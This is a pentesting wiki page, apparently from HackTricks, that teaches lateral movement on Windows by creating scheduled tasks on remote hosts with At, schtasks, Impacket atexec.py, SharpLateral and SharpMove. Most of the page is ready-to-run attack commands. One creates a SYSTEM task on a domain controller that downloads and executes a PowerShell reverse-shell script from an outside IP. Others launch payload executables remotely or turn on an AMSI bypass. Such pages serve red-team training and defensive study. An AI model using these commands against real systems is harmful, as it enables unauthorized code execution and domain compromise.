# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## How Does it works

At allows to schedule tasks in hosts where you know username/(password/Hash). So, you can use it to execute commands in other hosts and get the output.

```
At \\victim 11:00:00PM shutdown -r
```

Using schtasks you need first to create the task and then call it:

```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```

You can use **Impacket's `atexec.py`** to execute commands on remote systems using the AT command. This requires valid credentials (username and password or hash) for the target system.

```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```

You can also use [SharpLateral](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```

You can use [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```

More information about the [**use of schtasks with silver tickets here**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}



